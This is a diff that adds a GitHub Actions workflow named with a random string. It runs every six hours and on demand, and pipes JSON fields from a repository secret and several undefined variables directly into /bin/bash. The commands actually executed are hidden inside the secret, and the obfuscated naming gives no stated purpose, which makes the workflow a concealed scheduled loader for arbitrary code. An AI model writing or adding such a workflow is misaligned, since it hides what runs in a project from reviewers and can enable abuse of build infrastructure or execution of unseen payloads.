@@ -1,0 +1,22 @@
+name: zhuzhuanyun3987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuzhuanyun3987
+        env:
+          s0: ${{ secrets.s0 }}
+        run: |
+          echo $s0 | jq -r .gtmul2211 | /bin/bash
+          echo $riv332 | jq -r .x2398 | /bin/bash
+          echo $qh86 | jq -r .fgjvn42 | /bin/bash
+          echo $u1 | jq -r .fkx71 | /bin/bash
+          echo $hikp6059 | jq -r .u5738 | /bin/bash
+          echo $fzkka1677 | jq -r .npmqw45 | /bin/bash
+
